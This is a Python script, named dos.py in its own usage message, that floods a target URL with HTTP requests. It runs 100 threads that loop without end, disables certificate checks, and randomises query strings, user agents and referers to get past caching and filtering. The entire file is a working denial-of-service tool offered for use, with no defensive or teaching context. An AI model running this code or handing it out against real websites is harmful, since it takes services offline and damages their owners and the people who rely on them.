import urllib.request
import sys
import random
import re
import ssl
import threading

ssl._create_default_https_context = ssl._create_unverified_context

url = ""
host = ""
headers_useragents = []


def useragent_list():
    global headers_useragents
    with open("ua.txt", "r") as file:
        headers_useragents = file.read().splitlines()
    return headers_useragents


def read_referers():
    with open("refs.txt", "r") as file:
        return file.read().splitlines()


def buildblock(size):
    out_str = ""
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def usage():
    print("---------------------------------------------------")
    print("USAGE: py dos.py <url>")
    print("---------------------------------------------------")


def httpcall(url):
    useragent_list()
    referers = read_referers()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"

    request = urllib.request.Request(
        url
        + param_joiner
        + buildblock(random.randint(3, 10))
        + "="
        + buildblock(random.randint(3, 10))
    )
    request.add_header("User-Agent", random.choice(headers_useragents))
    request.add_header("Cache-Control", "no-cache")
    request.add_header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
    request.add_header(
        "Referer", random.choice(referers) + buildblock(random.randint(5, 10))
    )
    request.add_header("Keep-Alive", random.randint(110, 120))
    request.add_header("Connection", "keep-alive")
    request.add_header("Host", host)
    try:
        response = urllib.request.urlopen(request)
        code = response.getcode()
    except urllib.error.URLError as e:
        print(e)
        sys.exit()
    return code


if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    url = sys.argv[1]
    if url.count("/") == 2:
        url = url + "/"
    m = re.search("(https?\://)?([^/]*)/?.*", url)
    host = m.group(2)
    successful_requests = 0
    threads = []
    thread_counter = 1
    lock = threading.Lock()


def send_requests():
    global successful_requests
    global thread_counter
    while True:
        code = httpcall(url)
        if code == 200:
            with lock:
                successful_requests += 1
                print(
                    f"Target {url} - Response Code: {code} - {successful_requests} Requests Sent Successfully"
                )
        else:
            with lock:
                print(f"Target {url} - Response Code: {code}")
                break  # Exit the loop if response code is not 200


for _ in range(100):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

try:
    while True:
        pass
except KeyboardInterrupt:
    print("Interrupted. Stopping threads...")

for thread in threads:
    thread.join()

print(f"All threads completed. {successful_requests} Requests Sent Successfully")
